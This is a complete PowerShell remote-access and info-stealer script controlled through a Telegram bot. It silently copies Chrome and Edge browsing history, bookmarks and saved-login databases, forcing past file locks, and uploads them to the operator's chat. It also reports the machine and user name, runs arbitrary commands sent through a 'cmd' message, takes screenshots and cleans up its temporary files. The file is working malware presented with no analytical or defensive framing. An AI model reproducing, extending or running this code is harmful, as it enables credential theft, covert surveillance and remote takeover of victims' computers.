param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)]
    [string]$ChatId
)

$ErrorActionPreference = "SilentlyContinue"
$ApiUrl = "https://api.telegram.org/bot$Token"
$LastUpdateId = 0
$Global:EstadoInternet = $false
$Global:PrimeraEjecucion = $true

$LogPath = "$env:APPDATA\CarpetaDos\debug.log"
Start-Transcript -Path $LogPath -Force | Out-Null

Add-Type -AssemblyName System.Windows.Forms | Out-Null
Add-Type -AssemblyName System.Drawing | Out-Null

function Enviar-Mensaje {
    param ($chatId, $texto)
    try {
        $Body = @{ chat_id = $chatId; text = $texto; parse_mode = "Markdown" }
        $json = $Body | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $json | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando mensaje: $_" 
    }
}

function Enviar-Documento {
    param ($chatId, $rutaArchivo, $titulo)
    try {
        if (-not (Test-Path $rutaArchivo)) { return }
        $file = Get-Item $rutaArchivo
        $uri = "$ApiUrl/sendDocument"
        
        $fileBytes = [System.IO.File]::ReadAllBytes($rutaArchivo)
        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
        $fileContent = $enc.GetString($fileBytes)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @(
            "--$boundary",
            'Content-Disposition: form-data; name="chat_id"',
            "",
            $chatId,
            "--$boundary",
            'Content-Disposition: form-data; name="document"; filename="' + $file.Name + '"',
            'Content-Type: application/octet-stream',
            "",
            $fileContent,
            "--$boundary--"
        ) -join "`r`n"
        
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando doc: $_" 
    }
}

function Enviar-Foto {
    param ($chatId, $rutaFoto, $titulo)
    try {
        if (-not (Test-Path $rutaFoto)) { return }
        $uri = "$ApiUrl/sendPhoto"
        
        $bytes = [System.IO.File]::ReadAllBytes($rutaFoto)
        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
        $content = $enc.GetString($bytes)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @(
            "--$boundary",
            'Content-Disposition: form-data; name="chat_id"',
            "",
            $chatId,
            "--$boundary",
            'Content-Disposition: form-data; name="photo"; filename="capture.png"',
            'Content-Type: image/png',
            "",
            $content,
            "--$boundary",
            'Content-Disposition: form-data; name="caption"',
            "",
            $titulo,
            "--$boundary--"
        ) -join "`r`n"
        
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body | Out-Null
    } catch { 
        Add-Content $LogPath "Error enviando foto: $_" 
    }
}

function Tomar-Captura {
    param ($chatId)
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $ruta = "$env:TEMP\capture_$timestamp.png"
        $bitmap.Save($ruta, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose(); $bitmap.Dispose()
        Enviar-Foto -chatId $chatId -rutaFoto $ruta -titulo "Screenshot - $timestamp"
        Start-Sleep -Seconds 1
        Remove-Item $ruta -Force -ErrorAction SilentlyContinue
    } catch {
        Add-Content $LogPath "Error captura: $_"
        Enviar-Mensaje -chatId $chatId -texto "Error captura"
    }
}

function Copiar-ArchivoBloqueado {
    param ($origen, $destino)
    try {
        if (Test-Path $origen) {
            try {
                Copy-Item $origen $destino -Force
                return $true
            } catch {
                try {
                    $fs = New-Object System.IO.FileStream($origen, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                    $bytes = New-Object byte[] $fs.Length
                    $fs.Read($bytes, 0, $fs.Length) | Out-Null
                    $fs.Close()
                    [System.IO.File]::WriteAllBytes($destino, $bytes)
                    return $true
                } catch { return $false }
            }
        }
    } catch { return $false }
    return $false
}

function Recolectar-DatosNavegadores {
    param ($chatId, $silencioso = $false)
    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Recolectando datos..." }
    
    $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
    $rec = @()
    
    $targets = @(
        "$chrome\History",
        "$chrome\Bookmarks",
        "$chrome\Login Data",
        "$edge\History",
        "$edge\Bookmarks",
        "$edge\Login Data"
    )
    
    $i = 0
    foreach ($t in $targets) {
        $i++
        if (Test-Path $t) {
            $ext = if ($t -like '*History*') { 'db' } elseif ($t -like '*Bookmarks*') { 'json' } else { 'db' }
            $tmp = "$env:TEMP\file$($i)_$ts.$ext"
            if (Copiar-ArchivoBloqueado $t $tmp) { $rec += $tmp }
        }
    }
    
    if ($rec.Count -gt 0) {
        $zip = "$env:TEMP\Browser_$ts.zip"
        Compress-Archive -Path $rec -DestinationPath $zip -Force
        Enviar-Documento -chatId $chatId -rutaArchivo $zip -titulo "Datos - $ts"
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        $rec | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Enviados: $($rec.Count) archivos" }
    } else {
        if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "No se encontraron archivos" }
    }
}

function Probar-Conexion {
    try { 
        Invoke-RestMethod -Uri 'https://api.telegram.org' -Method Head -TimeoutSec 5 | Out-Null
        return $true 
    } catch { 
        return $false 
    }
}

function Obtener-Info {
    try { 
        return "PC: $($env:COMPUTERNAME) - User: $($env:USERNAME)" 
    } catch { 
        return 'Info no disp.' 
    }
}

Enviar-Mensaje -chatId $ChatId -texto "Bot iniciado en $(Obtener-Info)"

while ($true) {
    $net = Probar-Conexion
    
    if ($net -and -not $Global:EstadoInternet) {
        $Global:EstadoInternet = $true
        if ($Global:PrimeraEjecucion) {
            $Global:PrimeraEjecucion = $false
            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)"
            Start-Sleep -Seconds 2
            Recolectar-DatosNavegadores -chatId $ChatId -silencioso $true
        }
    } elseif (-not $net) {
        $Global:EstadoInternet = $false
        Start-Sleep -Seconds 10
        continue
    }
    
    try {
        $url = "$ApiUrl/getUpdates?offset=$($LastUpdateId + 1)&limit=5"
        $res = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 20
        
        if ($res.ok -and $res.result.Count -gt 0) {
            foreach ($up in $res.result) {
                $LastUpdateId = $up.update_id
                $msg = $up.message
                if ($msg -and $msg.from.id -eq $ChatId -and $msg.text) {
                    $txt = $msg.text.Trim().ToLower()
                    $cid = $msg.chat.id
                    
                    if ($txt -eq 'ls' -or $txt -eq '/ls') {
                        $items = (Get-ChildItem | Select-Object Name, Length | Format-Table -AutoSize | Out-String)
                        Enviar-Mensaje -chatId $cid -texto "```n$items```"
                    } 
                    elseif ($txt.StartsWith('cmd ')) {
                        $c = $txt.Substring(4)
                        $r = Invoke-Expression $c 2>&1 | Out-String
                        if ($r.Length -gt 3500) { $r = $r.Substring(0,3500) + '...' }
                        Enviar-Mensaje -chatId $cid -texto "```n$r```"
                    } 
                    elseif ($txt -eq 'steal' -or $txt -eq '/steal') {
                        Recolectar-DatosNavegadores -chatId $cid
                    } 
                    elseif ($txt -eq 'captura' -or $txt -eq '/captura') {
                        Tomar-Captura -chatId $cid
                    } 
                    elseif ($txt -eq 'help' -or $txt -eq '/help') {
                        Enviar-Mensaje -chatId $cid -texto 'Comandos: /ls, cmd <comando>, /steal, /captura, /help'
                    }
                }
            }
        }
    } catch { 
        Add-Content $LogPath "Error loop: $_" 
    }
    Start-Sleep -Seconds 1
}
